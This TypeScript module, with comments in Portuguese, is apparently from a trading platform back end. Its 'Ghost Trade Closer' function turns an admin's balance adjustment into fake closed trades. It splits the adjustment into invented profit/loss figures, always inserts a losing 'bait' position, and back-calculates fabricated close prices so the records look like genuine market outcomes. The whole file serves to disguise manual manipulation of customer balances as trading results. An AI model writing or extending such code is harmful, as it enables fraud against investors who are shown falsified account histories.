/**
 * Ghost Trade Closer
 *
 * Quando o admin ajusta o saldo (+X ou -X) e o utilizador tem posicoes abertas,
 * distribui o delta pelas posicoes existentes e fecha-as com P/L cujo somatorio
 * e EXACTAMENTE igual ao valor do ajuste.
 *
 * Regra obrigatoria (para N >= 2 posicoes):
 *   - SEMPRE pelo menos 1 fecha em NEGATIVO (sinal oposto ao delta)
 *   - SEMPRE pelo menos 1 fecha em POSITIVO
 *   - Soma de todos os PnL == delta (exacto, sem floating-point drift)
 */

function rand(min: number, max: number): number {
  return min + Math.random() * (max - min)
}

export interface OpenPosition {
  id:         string
  open_price: number
  lots:       number
  type:       "buy" | "sell"
  symbol:     string
  leverage:   number
}

export interface PositionClose {
  id:           string
  pnl:          number
  close_price:  number
  close_reason: string
  closed_at:    string
}

/**
 * Distribui `delta` pelas posicoes abertas de forma a que:
 *   - A soma dos P/L seja exactamente `delta`
 *   - Com >= 2 posicoes: SEMPRE pelo menos 1 negativa e pelo menos 1 positiva
 */
export function closePositionsWithDelta(
  openPositions: OpenPosition[],
  delta: number,
): PositionClose[] {
  const n = openPositions.length
  if (n === 0) return []

  const pnlValues: number[] = new Array(n).fill(0)

  if (n === 1) {
    // Unica posicao: fecha com o delta total
    pnlValues[0] = parseFloat(delta.toFixed(2))

  } else {
    // --- Passo 1: calcular o "bait" (sinal OPOSTO ao delta) ---------------
    // Minimo absoluto de $1.00 para nao arredondar para 0.00
    const baitSign = delta >= 0 ? -1 : +1
    const baitAbs  = Math.max(1.00, Math.abs(delta) * rand(0.15, 0.40))
    const baitPnl  = parseFloat((baitSign * baitAbs).toFixed(2))

    // --- Passo 2: distribuir o restante pelas outras N-1 posicoes ---------
    // Todas com o mesmo sinal do delta para garantir que o somatorio fecha certo
    const remaining = delta - baitPnl
    const others: number[] = []

    for (let i = 0; i < n - 2; i++) {
      const ratio = rand(0.30, 0.70)
      const v     = parseFloat((remaining * ratio).toFixed(2))
      others.push(v)
    }

    // A ultima fatia absorve o restante exacto (evita floating-point drift)
    const sumOthers = others.reduce((a, b) => a + b, 0)
    others.push(parseFloat((remaining - sumOthers).toFixed(2)))

    // --- Passo 3: montar o array final com o bait numa posicao aleatoria --
    const baitIndex = Math.floor(Math.random() * n)
    let otherIdx = 0
    for (let i = 0; i < n; i++) {
      if (i === baitIndex) {
        pnlValues[i] = baitPnl
      } else {
        pnlValues[i] = others[otherIdx++]
      }
    }
  }

  // --- Passo 4: calcular close_price consistente com cada PnL -------------
  const now = new Date().toISOString()

  return openPositions.map((pos, i) => {
    const pnl = pnlValues[i]

    // pnl = (close - open) * lots * contractSize  (buy)
    // pnl = (open - close) * lots * contractSize  (sell)
    const contractSize = 100_000
    const divisor      = pos.lots * contractSize
    const priceMove    = divisor > 0 ? pnl / divisor : 0

    const rawClose   = pos.type === "buy"
      ? pos.open_price + priceMove
      : pos.open_price - priceMove

    const decimals   = (pos.open_price.toString().split(".")[1] ?? "").length
    const closePrice = parseFloat(rawClose.toFixed(Math.max(decimals, 2)))

    return {
      id:           pos.id,
      pnl,
      close_price:  closePrice,
      close_reason: "adjustment",
      closed_at:    now,
    }
  })
}